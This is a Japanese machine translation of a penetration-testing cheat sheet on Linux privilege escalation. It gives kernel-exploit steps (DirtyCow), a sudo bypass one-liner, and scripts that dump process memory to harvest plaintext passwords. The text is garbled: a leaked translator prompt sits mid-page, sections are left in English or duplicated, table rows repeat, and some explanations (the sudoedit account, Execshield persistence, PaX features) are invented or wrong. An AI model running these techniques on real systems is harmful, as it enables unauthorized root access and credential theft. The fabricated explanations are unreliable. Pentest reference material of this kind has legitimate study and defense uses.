# Linux特権エスカレーション

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## システム情報

### OS情報

まず、実行しているOSの情報を知ることから始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし`PATH`変数内のどのフォルダに対しても**書き込み権限**を持っている場合、いくつかのライブラリやバイナリを乗っ取ることができるかもしれません。
```bash
echo $PATH
```
### 環境情報

環境変数において、興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### カーネルのエクスプロイト

カーネルのバージョンを確認し、特権を昇格させるために使用できるエクスプロイトがあるかどうかをチェックします。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、/hive/hacktricks/linux-hardening/privilege-escalation/README.md ファイルからのものです。関連する英文を日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を正確に保ちます。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどのものは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加の内容は追加しないでください。

```markdown
あなたはここで良い脆弱なカーネルのリストと、すでに**コンパイルされたエクスプロイト**を見つけることができます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。
他のサイトでいくつかの**コンパイルされたエクスプロイト**を見つけることができます: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルの脆弱性を検索するのに役立つツールは次のとおりです：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（被害者で実行し、カーネル2.xの脆弱性のみをチェックします）

常に**Googleでカーネルバージョンを検索**してください。おそらくカーネルバージョンがカーネルの脆弱性に記載されており、その脆弱性が有効であることが確認できます。

### CVE-2016-5195（DirtyCow）

Linux特権昇格 - Linuxカーネル <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudoのバージョン

以下に示す脆弱なsudoのバージョンに基づいています。
```bash
searchsploit sudo
```
次のgrepを使用して、sudoのバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### sudo < v1.28

@sickrov から

#### 概要

この特権昇格の方法は、sudoバージョン1.28より前のバージョンで利用可能です。

#### 詳細

この特権昇格の方法は、sudoバージョン1.28より前のバージョンで利用可能です。このバージョンでは、ユーザーがsudoersファイルに設定されたコマンドを実行する際に、環境変数を制御することができます。具体的には、`sudoedit`コマンドを使用して、環境変数`SUDO_EDITOR`を介して任意のコマンドを実行することができます。

この特権昇格の方法を利用するためには、以下の手順を実行します。

1. `sudoedit`コマンドを実行します。
2. `SUDO_EDITOR`環境変数を設定し、任意のコマンドを指定します。
3. `sudoedit`コマンドを終了します。

これにより、指定したコマンドが特権ユーザーとして実行されます。

#### 対策

この特権昇格の方法を防ぐためには、sudoバージョン1.28以降を使用するか、sudoersファイルで環境変数の制御を適切に設定する必要があります。また、不要なユーザーにsudo権限を与えないようにすることも重要です。
```
sudo -u#-1 /bin/bash
```
### Dmesg署名の検証に失敗しました

この脆弱性がどのように悪用されるかの**例**として、**HTBのsmasher2ボックス**をチェックしてください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### より詳細なシステム列挙

In this section, we will explore additional techniques for system enumeration that can help in identifying potential vulnerabilities and privilege escalation opportunities.

#### 1. Checking for SUID/SGID binaries

SUID (Set User ID) and SGID (Set Group ID) are special permissions that can be assigned to executable files. When a binary with SUID/SGID permissions is executed, it runs with the privileges of the file owner/group instead of the user executing it. This can potentially lead to privilege escalation if a vulnerable binary is found.

To check for SUID/SGID binaries, you can use the following command:

```bash
find / -perm -4000 -type f 2>/dev/null
```

This command will search for files with the SUID permission set. Similarly, you can use the following command to search for files with the SGID permission set:

```bash
find / -perm -2000 -type f 2>/dev/null
```

#### 2. Checking for writable directories

Writable directories can be potential targets for privilege escalation. If a directory is writable by a privileged user or group, an attacker can place a malicious executable in that directory and wait for it to be executed by a privileged user, thereby gaining elevated privileges.

To check for writable directories, you can use the following command:

```bash
find / -writable -type d 2>/dev/null
```

This command will search for directories that are writable by the current user.

#### 3. Checking for cron jobs

Cron jobs are scheduled tasks that run automatically at predefined intervals. These tasks are often executed with the privileges of the user who created them. By identifying cron jobs executed by privileged users, an attacker can potentially exploit them to escalate privileges.

To check for cron jobs, you can use the following command:

```bash
ls -la /etc/cron* /var/spool/cron/crontabs /etc/crontab
```

This command will list the cron jobs and their associated files.

#### 4. Checking for installed software and services

Installed software and services may have known vulnerabilities that can be exploited for privilege escalation. By identifying the versions of installed software and services, an attacker can search for known vulnerabilities and potential exploits.

To check for installed software and services, you can use the following commands:

```bash
dpkg -l  # For Debian-based systems
rpm -qa  # For Red Hat-based systems
```

These commands will list the installed packages and their versions.

#### 5. Checking for open ports and listening services

Open ports and listening services can provide valuable information about the system and potential entry points for privilege escalation. By identifying open ports and the associated services, an attacker can search for vulnerabilities specific to those services.

To check for open ports and listening services, you can use the following command:

```bash
netstat -tuln
```

This command will list the open ports and the services listening on those ports.

By performing these additional system enumeration techniques, you can gather more information about the target system and increase your chances of finding potential vulnerabilities and privilege escalation opportunities.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策を列挙する

### AppArmor

AppArmor is a Linux security module that provides mandatory access control (MAC) for programs. It restricts the capabilities of programs by defining a set of rules that determine what resources they can access. By default, AppArmor profiles are enabled for many applications in Ubuntu and other Linux distributions.

AppArmorは、プログラムのための強制アクセス制御（MAC）を提供するLinuxセキュリティモジュールです。プログラムの機能を制限するために、アクセスできるリソースを定義する一連のルールを定義します。デフォルトでは、Ubuntuや他のLinuxディストリビューションでは、多くのアプリケーションに対してAppArmorプロファイルが有効になっています。

To check if AppArmor is enabled, you can use the `aa-status` command. If it is enabled, you will see a list of active profiles.

AppArmorが有効かどうかを確認するには、`aa-status`コマンドを使用します。有効な場合、アクティブなプロファイルのリストが表示されます。

To bypass AppArmor, you can try to exploit vulnerabilities in the application or find ways to escalate privileges outside the scope of the AppArmor profile.

AppArmorをバイパスするには、アプリケーションの脆弱性を悪用するか、AppArmorプロファイルの範囲外で特権をエスカレーションする方法を見つけることができます。
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurityは、Linuxカーネルのセキュリティを向上させるためのパッチセットです。このパッチセットは、特権昇格攻撃やメモリの乱用などの一般的な攻撃を防ぐための機能を提供します。

Grsecurityは、以下の主な機能を提供します。

- プロセスの制限: Grsecurityは、プロセスが実行できる操作を制限するための機能を提供します。これにより、攻撃者が特権昇格攻撃を行うために必要な操作を制限することができます。

- メモリ保護: Grsecurityは、メモリの乱用に対する保護機能を提供します。これにより、攻撃者がバッファオーバーフローやヒープオーバーフローなどの攻撃を行うことを防ぐことができます。

- システムコールフィルタリング: Grsecurityは、システムコールの使用を制限するためのフィルタリング機能を提供します。これにより、攻撃者が悪意のあるシステムコールを使用して特権昇格を試みることを防ぐことができます。

- ネットワークセキュリティ: Grsecurityは、ネットワークセキュリティを向上させるための機能を提供します。これにより、攻撃者がネットワーク経由でシステムに侵入することを防ぐことができます。

Grsecurityは、Linuxカーネルのセキュリティを強化するための強力なツールです。その機能を活用することで、システムのセキュリティを向上させることができます。
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaXは、Linuxカーネルのセキュリティを向上させるためのパッチセットです。PaXは、実行可能なメモリ領域に対して制約を課すことで、悪意のあるコードの実行を防ぎます。これにより、バッファオーバーフローやスタックオーバーフローなどの攻撃を防ぐことができます。

PaXは、以下のようなセキュリティ機能を提供します。

- ASLR（アドレス空間配置のランダム化）：メモリ領域の配置をランダム化することで、攻撃者が特定のメモリアドレスを予測することを困難にします。
- NX（実行可能なメモリ領域の非実行）：データ領域に対して実行権限を割り当てないことで、攻撃者がデータ領域に埋め込まれた悪意のあるコードを実行することを防ぎます。
- RAP（ランダムなページ配置）：メモリページの配置をランダム化することで、攻撃者が特定のメモリページを予測することを困難にします。
- UDEREF（ユーザーデータの非参照）：ユーザーモードのコードがカーネルモードのメモリにアクセスできないようにします。

これらの機能により、PaXはLinuxシステムのセキュリティを強化し、特に特権昇格攻撃から保護します。PaXは、Linuxカーネルのハードニングにおいて重要な役割を果たします。
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshieldは、Linuxカーネルのセキュリティ機能の1つであり、実行可能なメモリ領域を保護するために使用されます。これにより、攻撃者が実行可能なメモリを悪用して特権昇格を行うことを防ぐことができます。

Execshieldは、以下の2つの主要な機能で構成されています。

1. **NXビット（No-Executeビット）**: メモリページに対して実行権限を制限するために使用されます。これにより、攻撃者が実行可能なメモリを書き換えてコードを実行することを防ぐことができます。

2. **ASLR（Address Space Layout Randomization）**: メモリ領域の配置をランダム化するために使用されます。これにより、攻撃者が特定のメモリアドレスを予測して攻撃を行うことを困難にします。

Execshieldは、デフォルトで有効になっている場合がありますが、一部のシステムでは無効になっている場合もあります。セキュリティを強化するためには、Execshieldを有効にすることをお勧めします。

Execshieldの設定は、`/proc/sys/kernel/exec-shield`ファイルを介して制御されます。有効にするには、次のコマンドを実行します。

```bash
echo 1 > /proc/sys/kernel/exec-shield
```

無効にするには、次のコマンドを実行します。

```bash
echo 0 > /proc/sys/kernel/exec-shield
```

Execshieldの設定は、システムの再起動後も有効になります。
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux（Security-Enhanced Linux）は、Linuxカーネルに組み込まれたセキュリティ機能です。SElinuxは、アクセス制御ポリシーを使用して、システム上のプロセスやファイルへのアクセスを制限します。これにより、特権昇格攻撃やシステムへの不正アクセスを防ぐことができます。

SElinuxは、ファイルのセキュリティコンテキストと呼ばれるラベルを使用して、アクセス制御を実施します。各ファイルには、所有者、グループ、パーミッションに加えて、セキュリティコンテキストが割り当てられます。セキュリティコンテキストは、ファイルのタイプやアクセス許可を指定します。

SElinuxは、デフォルトでは無効になっている場合がありますが、有効にすることでシステムのセキュリティを向上させることができます。ただし、SElinuxは複雑な設定を必要とするため、正しく設定されていない場合には予期しない問題が発生する可能性があります。

SElinuxの設定は、`/etc/selinux/config`ファイルで行います。このファイルを編集して、SElinuxを有効にするか無効にするかを設定することができます。また、`sestatus`コマンドを使用して、現在のSElinuxの状態を確認することもできます。

特権昇格攻撃を防ぐためには、SElinuxを適切に設定することが重要です。セキュリティコンテキストを正しく設定し、不要なアクセスを制限することで、システムのセキュリティを強化することができます。
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
ASLR（Address Space Layout Randomization）は、プログラムのセキュリティを向上させるための技術です。ASLRは、プログラムのメモリアドレスをランダムに配置することで、攻撃者が特定のメモリアドレスを予測することを困難にします。これにより、攻撃者が悪意のあるコードを実行するために必要なメモリアドレスを特定することが難しくなります。

ASLRは、特にプライビリージエスカレーション攻撃に対して効果的です。攻撃者は、特権を持つプロセスのメモリアドレスを特定することで、特権を奪取することができます。しかし、ASLRが有効になっている場合、攻撃者はメモリアドレスを予測することができず、特権の奪取が困難になります。

ASLRは、Linuxカーネルによって提供される機能であり、デフォルトで有効になっています。ただし、一部の古いシステムでは無効になっている場合があります。ASLRを有効にするには、`/proc/sys/kernel/randomize_va_space`ファイルの値を`2`に設定します。

ASLRの有効化は、プログラムのセキュリティを向上させるための重要な手段です。攻撃者が特定のメモリアドレスを予測できないため、プログラムの脆弱性を悪用することが困難になります。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もしDockerコンテナ内にいる場合、脱出を試みることができます:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## ドライブ

マウントされているものとアンマウントされているもの、どこにあるか、なぜそうなっているかを確認してください。もし何かがアンマウントされている場合、それをマウントしてプライベート情報をチェックすることができます。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 便利なソフトウェア

有用なバイナリを列挙する

```markdown
| Binary | Description |
|--------|-------------|
| [find](https://man7.org/linux/man-pages/man1/find.1.html) | ファイルやディレクトリを検索する |
| [grep](https://man7.org/linux/man-pages/man1/grep.1.html) | ファイル内のパターンを検索する |
| [awk](https://man7.org/linux/man-pages/man1/awk.1.html) | テキスト処理のためのパターンスキャンと処理言語 |
| [sed](https://man7.org/linux/man-pages/man1/sed.1.html) | テキスト処理のためのストリームエディタ |
| [curl](https://man7.org/linux/man-pages/man1/curl.1.html) | URLを使用してデータを転送する |
| [wget](https://man7.org/linux/man-pages/man1/wget.1.html) | インターネット上のファイルをダウンロードする |
| [nc](https://man7.org/linux/man-pages/man1/nc.1.html) | ネットワーク接続を作成および管理する |
| [nmap](https://nmap.org/book/man.html) | ネットワーク探査ツール |
| [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html) | パケットキャプチャツール |
| [wireshark](https://www.wireshark.org/docs/man-pages/wireshark.html) | ネットワークプロトコルアナライザ |
| [ps](https://man7.org/linux/man-pages/man1/ps.1.html) | プロセスのスナップショットを表示する |
| [top](https://man7.org/linux/man-pages/man1/top.1.html) | 実行中のプロセスを監視する |
| [lsof](https://man7.org/linux/man-pages/man8/lsof.8.html) | オープンされているファイルとプロセスを表示する |
| [strace](https://man7.org/linux/man-pages/man1/strace.1.html) | プロセスのシステムコールとシグナルをトレースする |
| [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html) | プロセスのライブラリ関数呼び出しをトレースする |
| [file](https://man7.org/linux/man-pages/man1/file.1.html) | ファイルの種類を判別する |
| [strings](https://man7.org/linux/man-pages/man1/strings.1.html) | バイナリファイル内の文字列を表示する |
| [hexdump](https://man7.org/linux/man-pages/man1/hexdump.1.html) | バイナリファイルを16進数で表示する |
| [xxd](https://man7.org/linux/man-pages/man1/xxd.1.html) | バイナリファイルを16進数で表示する |
| [base64](https://man7.org/linux/man-pages/man1/base64.1.html) | バイナリデータをテキストにエンコードおよびデコードする |
| [openssl](https://www.openssl.org/docs/man1.1.1/man1/openssl.html) | 暗号化、復号化、証明書の操作などを行う |
| [ssh](https://man7.org/linux/man-pages/man1/ssh.1.html) | セキュアなリモートシェル接続を提供する |
| [scp](https://man7.org/linux/man-pages/man1/scp.1.html) | ファイルをリモートホストにコピーする |
| [rsync](https://man7.org/linux/man-pages/man1/rsync.1.html) | ファイルとディレクトリをローカルおよびリモート間で同期する |
| [tar](https://man7.org/linux/man-pages/man1/tar.1.html) | ファイルアーカイブを作成および操作する |
| [zip](https://linux.die.net/man/1/zip) | ファイルを圧縮および解凍する |
| [unzip](https://linux.die.net/man/1/unzip) | ZIPアーカイブを解凍する |
| [sudo](https://man7.org/linux/man-pages/man8/sudo.8.html) | 特権ユーザーとしてコマンドを実行する |
| [su](https://man7.org/linux/man-pages/man1/su.1.html) | 別のユーザーに切り替える |
| [chown](https://man7.org/linux/man-pages/man1/chown.1.html) | ファイルの所有者を変更する |
| [chmod](https://man7.org/linux/man-pages/man1/chmod.1.html) | ファイルのアクセス権を変更する |
| [chattr](https://man7.org/linux/man-pages/man1/chattr.1.html) | ファイルの属性を変更する |
| [setuid](https://man7.org/linux/man-pages/man2/setuid.2.html) | プロセスの実行ユーザーIDを変更する |
| [setgid](https://man7.org/linux/man-pages/man2/setgid.2.html) | プロセスの実行グループIDを変更する |
| [setcap](https://man7.org/linux/man-pages/man8/setcap.8.html) | バイナリに特権を付与する |
| [ld.so.preload](https://man7.org/linux/man-pages/man8/ld.so.8.html) | 共有ライブラリのプリロードパスを設定する |
| [ldconfig](https://man7.org/linux/man-pages/man8/ldconfig.8.html) | 共有ライブラリのキャッシュを更新する |
| [cron](https://man7.org/linux/man-pages/man8/cron.8.html) | タスクを定期的に実行する |
| [at](https://man7.org/linux/man-pages/man1/at.1.html) | 一度だけタスクを実行する |
| [systemctl](https://man7.org/linux/man-pages/man1/systemctl.1.html) | システムのサービスを管理する |
| [journalctl](https://man7.org/linux/man-pages/man1/journalctl.1.html) | システムのジャーナルログを表示する |
| [crontab](https://man7.org/linux/man-pages/man1/crontab.1.html) | ユーザーのクロンジョブを管理する |
| [ssh-agent](https://man7.org/linux/man-pages/man1/ssh-agent.1.html) | SSHエージェントを起動する |
| [gpg](https://man7.org/linux/man-pages/man1/gpg.1.html) | 暗号化、復号化、署名、鍵の管理などを行う |
| [pgrep](https://man7.org/linux/man-pages/man1/pgrep.1.html) | プロセスを条件に基づいて検索する |
| [pkill](https://man7.org/linux/man-pages/man1/pkill.1.html) | プロセスを条件に基づいて終了する |
| [kill](https://man7.org/linux/man-pages/man1/kill.1.html) | プロセスにシグナルを送信する |
| [nohup](https://man7.org/linux/man-pages/man1/nohup.1.html) | プロセスをデタッチし、SIGHUPを無視する |
| [screen](https://www.gnu.org/software/screen/manual/screen.html) | 仮想ターミナルを作成および管理する |
| [tmux](https://man7.org/linux/man-pages/man1/tmux.1.html) | 仮想ターミナルを作成および管理する |
| [sudoedit](https://man7.org/linux/man-pages/man8/sudoedit.8.html) | 特権ユーザーとしてファイルを編集する |
| [strace](https://man7.org/linux/man-pages/man1/strace.1.html) | プロセスのシステムコールとシグナルをトレースする |
| [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html) | プロセスのライブラリ関数呼び出しをトレースする |
| [gdb](https://man7.org/linux/man-pages/man1/gdb.1.html) | プログラムのデバッグとトラブルシューティングを行う |
| [objdump](https://man7.org/linux/man-pages/man1/objdump.1.html) | バイナリファイルの情報を表示する |
| [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) | ELFファイルの情報を表示する |
| [ldd](https://man7.org/linux/man-pages/man1/ldd.1.html) | 共有ライブラリの依存関係を表示する |
| [strace](https://man7.org/linux/man-pages/man1/strace.1.html) | プロセスのシステムコールとシグナルをトレースする |
| [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html) | プロセスのライブラリ関数呼び出しをトレースする |
| [gdb](https://man7.org/linux/man-pages/man1/gdb.1.html) | プログラムのデバッグとトラブルシューティングを行う |
| [objdump](https://man7.org/linux/man-pages/man1/objdump.1.html) | バイナリファイルの情報を表示する |
| [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) | ELFファイルの情報を表示する |
| [ldd](https://man7.org/linux/man-pages/man1/ldd.1.html) | 共有ライブラリの依存関係を表示する |
```

以上
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**インストールされているコンパイラを確認**してください。これは、カーネルのエクスプロイトを使用する必要がある場合に役立ちます。エクスプロイトをコンパイルする場合は、使用するマシン（または類似のマシン）でコンパイルすることが推奨されています。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### インストールされた脆弱性のあるソフトウェア

**インストールされたパッケージやサービスのバージョン**を確認してください。たとえば、特定の古いNagiosのバージョンがある場合、特権のエスカレーションに悪用される可能性があります...\
より疑わしいインストールされたソフトウェアのバージョンを手動で確認することをおすすめします。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンへのSSHアクセスがある場合、**openVAS**を使用してマシン内にインストールされた古くて脆弱なソフトウェアをチェックすることもできます。

{% hint style="info" %}
_これらのコマンドはほとんど役に立たない情報を表示する可能性があるため、既知の脆弱性に対してインストールされたソフトウェアのバージョンが脆弱であるかどうかをチェックするために、OpenVASや同様のアプリケーションを使用することをおすすめします_
{% endhint %}

## プロセス

**実行されているプロセス**を確認し、**それ以上の権限を持つプロセス**がないかどうかをチェックしてください（たとえば、rootで実行されているtomcatなど）。
```bash
ps aux
ps -ef
top -n 1
```
常に実行中の[**electron/cef/chromiumデバッガー**を確認し、特権をエスカレーションするために悪用することができます](electron-cef-chromium-debugger-abuse.md)。**Linpeas**は、プロセスのコマンドライン内の`--inspect`パラメータをチェックすることでこれらを検出します。\
また、**プロセスのバイナリに対する特権を確認**してください。他のユーザーに属するプロセスのメモリを上書きすることができるかもしれません。

### プロセスの監視

[**pspy**](https://github.com/DominicBreuker/pspy)のようなツールを使用してプロセスを監視することができます。これは、脆弱なプロセスが頻繁に実行されるか、一連の要件が満たされたときに特に役立ちます。

### プロセスのメモリ

サーバーの一部のサービスは、**クリアテキストで資格情報をメモリ内に保存**します。\
通常、他のユーザーに属するプロセスのメモリを読み取るには**ルート特権**が必要です。そのため、これは通常、既にルート権限を持っていてさらに資格情報を発見したい場合により有用です。\
ただし、**通常のユーザーとして、所有するプロセスのメモリを読み取ることができます**。

{% hint style="warning" %}
現在では、ほとんどのマシンはデフォルトで**ptraceを許可していません**。つまり、特権のないユーザーに属する他のプロセスをダンプすることはできません。

ファイル_**/proc/sys/kernel/yama/ptrace\_scope**_は、ptraceのアクセシビリティを制御します：

* **kernel.yama.ptrace\_scope = 0**：すべてのプロセスは、同じuidを持っている限りデバッグできます。これは、ptracingが動作する古典的な方法です。
* **kernel.yama.ptrace\_scope = 1**：親プロセスのみがデバッグできます。
* **kernel.yama.ptrace\_scope = 2**：管理者のみがptraceを使用できます。CAP\_SYS\_PTRACE機能が必要です。
* **kernel.yama.ptrace\_scope = 3**：ptraceでプロセスをトレースすることはできません。設定後、再起動が必要です。
{% endhint %}

#### GDB

FTPサービスのメモリにアクセスできる場合（例えば）、ヒープを取得し、その資格情報を検索することができます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDBスクリプト

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、\*\*mapsはそのプロセスの\*\*仮想アドレス空間内でメモリがマップされている方法を示し、また、**各マップされた領域のアクセス権限**も表示します。**mem**擬似ファイルは、プロセスのメモリ自体を**公開**します。**maps**ファイルからは、**読み取り可能なメモリ領域とそのオフセット**がわかります。この情報を使用して、**memファイルにシークし、すべての読み取り可能な領域をファイルにダンプ**します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`はシステムの**物理**メモリにアクセスするためのものであり、仮想メモリではありません。カーネルの仮想アドレス空間には`/dev/kmem`を使用してアクセスできます。\
通常、`/dev/mem`は**root**と**kmem**グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDumpは、WindowsのSysinternalsツールスイートのクラシックなProcDumpツールのLinux版です。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)から入手できます。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするためには、以下のツールを使用することができます：

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_rootの要件を手動で削除し、所有しているプロセスをダンプすることができます
* [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)のスクリプトA.5 (rootが必要です)

### プロセスメモリからの資格情報

#### 手動の例

もし、認証プロセスが実行されていることがわかった場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプすることができます（プロセスのメモリをダンプするさまざまな方法については、前のセクションを参照してください）。メモリ内で資格情報を検索します。
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール[**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)は、メモリと一部の**よく知られたファイル**から**平文の資格情報を盗みます**。正しく動作するためには、ルート権限が必要です。

| 機能                                              | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDMパスワード（Kaliデスクトップ、Debianデスクトップ） | gdm-password         |
| Gnome Keyring（Ubuntuデスクトップ、ArchLinuxデスクトップ） | gnome-keyring-daemon |
| LightDM（Ubuntuデスクトップ）                          | lightdm              |
| VSFTPd（アクティブなFTP接続）                   | vsftpd               |
| Apache2（アクティブなHTTPベーシック認証セッション）         | apache2              |
| OpenSSH（アクティブなSSHセッション - Sudo使用）        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
